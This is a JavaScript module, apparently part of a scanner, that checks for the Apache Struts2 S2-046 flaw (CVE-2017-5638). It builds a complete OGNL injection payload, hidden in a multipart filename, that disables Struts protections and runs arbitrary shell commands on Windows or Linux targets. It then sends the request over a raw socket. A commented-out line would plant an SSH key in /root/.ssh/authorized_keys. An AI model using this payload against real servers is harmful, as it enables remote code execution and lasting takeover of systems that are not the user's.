
module.exports={
	tags:"struts2,046,cve-2017-5638,20175638",
	"ID":"020103",
	des:"CVE-2017-5638,struts2 046Vulnerability detection",
	VulApps:["https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-046",
		"http://oe58q5lw3.bkt.clouddn.com/s/struts2/struts2/s2-046.war"],
	urls:["https://cwiki.apache.org/confluence/display/WW/S2-046",
	"https://nvd.nist.gov/vuln/detail/CVE-2017-5638","https://raw.githubusercontent.com/yibeizifd/S2-046/master/s2-046.sh"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = _t.self;
		var uO = _s.parseUrl(url),host = uO.host.split(/:/)[0], port = uO.port || 80;
		// 测试证明不能encodeURIComponent编码，filename 后的\0b不能少
		var s = ("%{(#mtx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','" + _s.g_szCmdW + "'}:{'/bin/bash','-c','" + _s.g_szCmd + "'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())" 
			+ ".(#response=@org.apache.struts2.ServletActionContext@getResponse())"
			 + ".(#response.addHeader('struts2','_struts2_'))"
			+ ".(#ros=(#response.getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
			);
		var szPstDt = s,szPF = "/tmp/" + new Date().getTime();
		try{
			// var szPayload1 = `java -jar jars/ysoserial-0.0.6-SNAPSHOT-all.jar FileUpload1 'write;/root/.ssh/authorized_keys;${_s.config.xKeys}'`;
			// _s.child_process.execSync( szPayload1 + ">" + szPF);
			var sP = "x";//_s.fs.readFileSync(szPF).toString("binary");

			if(/.*?\/$/g.test(uO.path))uO.path = uO.path.substr(0, uO.path.length - 1);
			// Expect: \r\n
			var szTmp = '',tNum = 'e5a4a9'/*new Date().getTime()*/,
				boundary = '---------------------------e5a48f' + tNum,
				szTmp2 = '--' + boundary + '\r\nContent-Disposition: form-data; name="x"; filename="'
				 + s + '\0b"\r\nContent-Type: text/plain\r\n\r\n' + sP + '\r\n--' + boundary + '--\r\n\r\n';
			_s.fnSocket(host,port,szTmp = 'POST ' + uO.path + ' HTTP/1.1\r\nHost: ' 
				+ uO.host + '\r\nContent-Length: ' + (szTmp2.length + 4) + '\r\nUser-Agent: ' 
				+ _s.g_szUa + '\r\nContent-Type: multipart/form-data; boundary=' + boundary 
			+ '\r\nConnection: close\r\n\r\n' + szTmp2,
				function(data)
			{
				// console.log(data)
				var d = (data && data.toString().trim() || "").toString("utf8");
				_s.fnShowBody(d);
	    		_s.fnDoBody(d,"s2-046",url,null,function(o)
	  			{
	  				var r = {"url":url,"send":szTmp};
	  				// console.log(szTmp);
	  				if(fnCbk)fnCbk(_s.copyO2O(r,o),_t);
	  			});
			});
		}catch(e){_s.error(e,'doCheck.046');}
	}
};